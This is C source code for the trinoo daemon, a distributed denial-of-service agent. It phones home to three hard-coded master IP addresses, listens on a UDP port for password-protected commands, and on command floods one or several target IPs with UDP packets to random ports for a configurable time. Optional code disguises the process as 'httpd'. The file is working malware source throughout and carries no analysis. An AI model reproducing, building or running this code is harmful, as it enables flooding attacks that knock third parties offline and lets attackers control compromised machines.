/* trinoo daemon */

#define _XOPEN_SOURCE 1000
#define _BSD_SOURCE

#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netdb.h>
#include <time.h>

/* ----------------- strfix.h ----------------- */
#ifdef __GNUC__
#define strcpy(dst, src) \
({ \
        char *_out = (dst); \
        if (sizeof(dst) <= sizeof(char *)) \
                _out = strcpy(_out, (src)); \
        else { \
                *_out = 0; \
                _out = strncat(_out, (src), sizeof(dst) - 1); \
        } \
        _out; \
})
#define strcat(dst, src) \
({ \
        char *_out = (dst); \
        if (sizeof(dst) <= sizeof(char *)) \
                _out = strcat(_out, (src)); \
        else { \
                size_t _size = sizeof(dst) - strlen(_out) - 1; \
                if (_size > 0) _out = strncat(_out, (src), _size); \
        } \
        _out; \
})
#endif
/* ----------------- END of strfix.h  ----------------- */

/* #define PROCNAME "httpd" */
char *master[] = {
	"129.237.122.40",
	"207.228.116.19",
	"209.74.175.130",
	NULL
};

#define DEFSIZE 1000

int hello();
int getsock();
int sendudp(char *host, char *data, int port);

int main(int argc __attribute__((unused)), char **argv __attribute__((unused)), char **ennvp __attribute__((unused)))
{
	int sock, numread, sock2, timerz = 120, hoe, foke;
	struct sockaddr_in sa, from, to;
	socklen_t fromlen;
	char buf[1024];
	char arg1[4], *arg2, pass[10], *temp, *unf;
	void *buf2;
	int start, end, stop = 0;
#ifdef PROCNAME
	int bewm;
	for (bewm = argc - 1; bewm >= 0; bewm--)
		memset(argv[bewm], 0, strlen(argv[bewm]));
	strcpy(argv[0], PROCNAME);
#endif
	buf2 = (void *)malloc(DEFSIZE);

	if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
		perror("socket");
		exit(-1);
	}

	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = INADDR_ANY;
	sa.sin_port = htons(27444);
	to.sin_family = AF_INET;

	if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind");
		exit(-1);
	}
	hello();
	foke = fork();
	if (foke > 0) {
		hoe = setpgid(foke, foke);
		exit(0);
	}
	if (foke == -1)
		exit(-1);
	while (1) {
		bzero(arg1, 4);
		bzero(buf, 1024);
		fromlen = sizeof(from);
		if ((numread =
		     recvfrom(sock, buf, 1024, 0, (struct sockaddr *)&from,
			      &fromlen)) < 0) {
			perror("recvfrom");
			continue;
		}
		if (strstr("l44", buf) == 0) {
			arg2 = malloc(sizeof(buf));
			sscanf(buf, "%s %s %s", arg1, pass, arg2);
			if (strcmp((char *)crypt(pass, "aI"), "aIf3YWfOhw.V.")
			    == 0) {
				if (strcmp(arg1, "aaa") == 0) {
					to.sin_addr.s_addr = inet_addr(arg2);
					start = time(NULL);
					end = start + timerz;
					stop = 0;
					if ((sock2 = getsock()) != -1)
						while (!stop) {
							to.sin_port =
							    htons(rand() %
								  65534);
							sendto(sock2, buf2,
							       sizeof(buf2), 0,
							       (struct sockaddr
								*)(&to),
							       sizeof(to));
							if (time(NULL) > end) {
								close(sock2);
								stop = 1;
							}
						}
					stop = 0;
				}
				if (strcmp(arg1, "bbb") == 0) {
					if (atoi(arg2) > 1000)
						timerz = 500;
					else
						timerz = atoi(arg2);
				}
				if (strcmp(arg1, "shi") == 0)
					hello();
				if (strcmp(arg1, "png") == 0)
					sendudp((char *)
						inet_ntoa(from.sin_addr),
						"PONG", 31335);
				if (strcmp(arg1, "d1e") == 0)
					exit(1);
				if (strcmp(arg1, "rsz") == 0) {
					free(buf2);
					buf2 = malloc(atoi(arg2));
					bzero(buf2, sizeof(buf2));
				}
				if (strcmp(arg1, "xyz") == 0) {
					start = time(NULL);
					end = start + timerz;
					unf = malloc(sizeof(arg2));
					if ((sock2 = getsock()) != -1)
						while (!stop) {
							bzero(unf, sizeof(unf));
							strcat(unf, arg2);
							temp = strtok(unf, ":");
							while ((temp =
								strtok(NULL,
								       ":")) !=
							       NULL) {
								printf("%s\n",
								       temp);
								to.sin_addr.
								    s_addr =
								    inet_addr
								    (temp);
								to.sin_port =
								    htons(rand()
									  %
									  65534);
								if (!stop)
									sendto
									    (sock2,
									     buf2,
									     sizeof
									     (buf2),
									     0,
									     (struct
									      sockaddr
									      *)
									     (&to), sizeof(to));
								if (time(NULL) >
								    end) {
									close
									    (sock2);
									stop =
									    1;
								}
							}
						}
					free(unf);
					stop = 0;
				}
				free(arg2);
			}
		}
	}
	return 0;
}

int sendudp(char *host, char *data, int port)
{
	int unf;
	struct sockaddr_in out;

	out.sin_family = AF_INET;
	out.sin_addr.s_addr = inet_addr(host);
	out.sin_port = htons(port);

	if ((unf = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
		return -1;
	sendto(unf, data, strlen(data), 0, (struct sockaddr *)&out,
	       sizeof(out));
	return 1;
}

int hello()
{
	int i = 0;
	while (master[i] != NULL) {
		sendudp(master[i], "*HELLO*", 31335);
		i++;
	}
	return 0;
}

int getsock()
{
	int i;
	if ((i = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) != -1)
		return i;
	else
		return -1;
}
